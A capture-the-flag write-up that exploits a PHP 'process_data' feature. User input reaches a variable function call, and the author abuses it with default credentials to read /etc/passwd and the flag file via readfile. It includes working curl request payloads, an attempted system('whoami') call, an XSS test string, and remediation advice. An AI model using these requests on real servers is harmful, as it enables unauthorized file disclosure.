# TimeTracker Pro — Arbitrary Function Invocation to LFI

**Category:** Web Exploitation **CTF:** Black Hat (FlagYard) **Target:** `TimeTracker Pro` — PHP timesheet management app **Flag:** `FlagY{67f10c41849ce15cf8b25fe59c4b2448}`

---

## 1. Summary

`TimeTracker Pro` is a small PHP timesheet application. After authenticating with default credentials, a "Data Processing" feature under the Export page passes a user-supplied string directly into a dynamic (variable) function call. Because the target function name is not restricted to a safe allow-list, an attacker can invoke arbitrary single-argument PHP functions. Command-execution functions were disabled via `disable_functions`, but `readfile()` was not, allowing arbitrary local file read (LFI) and disclosure of the flag file.

---

## 2. Recon & Initial Access

Source code for the application was reviewed directly (`config.php`, `index.php`).

- `config.php` set standard app configuration (timezone, error logging, data directory).
- `index.php` implemented a minimal session-based login with **hardcoded credentials**:

```php
if ($_POST['username'] === 'admin' && $_POST['password'] === 'admin123') {
    $_SESSION['user_id'] = 1;
    $_SESSION['username'] = 'admin';
}
```

Logging in with `admin:admin123` granted access to the dashboard.

---

## 3. Vulnerability Analysis

### 3.1 Input handling review

The dashboard's timesheet entries (`employee_name`, `project_name`, `description`) were rendered using `htmlspecialchars()`, so reflected/stored XSS was not viable there. A test payload confirmed proper output encoding:

```
Input:  '><script>alert(1)</script>
Output: &#039;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
```

Attention then shifted to the `reports` and `export` actions, which surfaced a third, undocumented feature: **Data Processing**.

### 3.2 The vulnerable code

Inside the `process_data` switch case:

```php
case 'process_data':
    if (isset($_GET['processor']) && isset($_GET['data'])) {
        $processor = $_GET['processor'];
        $data = $_GET['data'];

        if ($processor === 'calculate_overtime') {
            $overtime = max(0, floatval($data) - 40);
            echo "Overtime hours: " . $overtime;
        } elseif ($processor === 'format_currency') {
            echo "$" . number_format(floatval($data), 2);
        } elseif ($processor === 'validate_hours') {
            echo (floatval($data) >= 0 && floatval($data) <= 24) ? "Valid" : "Invalid";
        } else {
            $processor($data);   // <-- vulnerable line
        }
    }
    break;
```

Three "known" processor names are handled safely. Any other value falls through to:

```php
$processor($data);
```

In PHP, calling a variable as `$variable(...)` invokes the function whose **name is the string's value** — a feature known as a _variable function call_. Since `$processor` and `$data` both come straight from `$_GET` with no allow-list or validation, an attacker can call **any built-in or user-defined PHP function that accepts a single argument**, passing fully attacker-controlled input.

This is a textbook **Arbitrary Function Invocation** vulnerability, closely related to PHP Object Injection and "function name injection" classes of bugs.

---

## 4. Exploitation

### 4.1 Confirming code execution

```
GET /index.php?action=process_data&processor=phpinfo&data=1
```

Returned a full `phpinfo()` page, confirming that arbitrary function calls were reachable and unauthenticated-parameter-controlled function names executed successfully.

### 4.2 Attempting command execution

```
GET /index.php?action=process_data&processor=system&data=whoami
```

`system()` executed without error but produced **no visible output**. This is because `system()` in this context is being invoked purely for its side effect (printing to stdout is normally automatic for `system()`, so the more likely explanation is that `system`, `exec`, `shell_exec`, and `passthru` were listed in `disable_functions` in `php.ini`, silently no-oping the call). `phpinfo()` output confirmed the PHP build (`8.1.33`, Docker-based, `docker-php-ext-*` extensions loaded), consistent with a hardened container image restricting shell-execution functions.

### 4.3 Pivoting to LFI via output-producing functions

Since PHP evaluates `$processor($data);` as a bare statement (its return value is discarded, not echoed), only functions that **print/output their own result** produce visible output — regardless of whether they're blocked by `disable_functions`. This ruled out functions like `file_get_contents()` (returns a string but doesn't print it) unless later echoed, but functions such as `readfile()`, `show_source()`, and `highlight_file()` output directly.

```
GET /index.php?action=process_data&processor=readfile&data=/etc/passwd
```

**Result:** full contents of `/etc/passwd` returned in the response body, confirming arbitrary local file read.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

### 4.4 Locating and reading the flag

Standard CTF flag paths were enumerated:

```
GET /index.php?action=process_data&processor=readfile&data=/app/flag.txt
```

**Result:**

```
FlagY{67f10c41849ce15cf8b25fe59c4b2448}
```

---

## 5. Root Cause

1. **Untrusted input used as a callable.** `$_GET['processor']` is used directly as a PHP function name with no allow-list, type check, or `function_exists()` restriction against a safe set of names.
2. **Untrusted input passed as the function's argument.** `$_GET['data']` is passed unsanitized, enabling path traversal / arbitrary file read once a file-reading function is reachable.
3. **Defense (`disable_functions`) was incomplete.** Shell-execution functions were disabled, but output-producing file functions (`readfile`, `show_source`, `highlight_file`) and information-disclosure functions (`phpinfo`) were left callable, which was sufficient to achieve LFI and information disclosure.

---

## 6. Impact

- **Arbitrary local file disclosure** on the web server, including configuration files, source code, and any file readable by the `www-data` process.
- **Information disclosure** via `phpinfo()` (PHP version, loaded extensions, config paths, environment details) — useful for further attack chaining.
- Depending on `disable_functions` configuration in other environments, this same sink could yield **full remote code execution** (e.g. via `system`, `exec`, `assert`, `create_function`, or PHP filter chains/`include`-based techniques), making this a **critical** severity finding.

---

## 7. Remediation

- **Never use user input as a function name.** Replace the dynamic `$processor($data)` call with an explicit `switch`/allow-list of permitted processor names, exactly as already done for `calculate_overtime`, `format_currency`, and `validate_hours`. Reject anything else outright.
- If dynamic dispatch is truly required, validate `$processor` against `in_array($processor, $allowed_functions, true)` **before** calling it, and never allow arbitrary user strings to reach a callable context.
- Apply **input validation and output encoding** consistently across all parameters, not just rendered HTML fields.
- Treat `disable_functions` as **defense in depth only** — it is not a substitute for fixing the underlying injection point, since many output/file/reflection functions fall outside typical disable lists.
- Run the PHP process with a minimally privileged filesystem context (containers/chroot/jail) so that even a successful LFI cannot reach sensitive files outside the application's own directory.

---

## 8. Timeline / PoC Commands

```bash
# Confirm arbitrary function execution
curl "http://<target>/index.php?action=process_data&processor=phpinfo&data=1" \
     -b "PHPSESSID=<session>"

# Confirm LFI
curl "http://<target>/index.php?action=process_data&processor=readfile&data=/etc/passwd" \
     -b "PHPSESSID=<session>"

# Retrieve flag
curl "http://<target>/index.php?action=process_data&processor=readfile&data=/app/flag.txt" \
     -b "PHPSESSID=<session>"
```

**Flag:** `FlagY{67f10c41849ce15cf8b25fe59c4b2448}`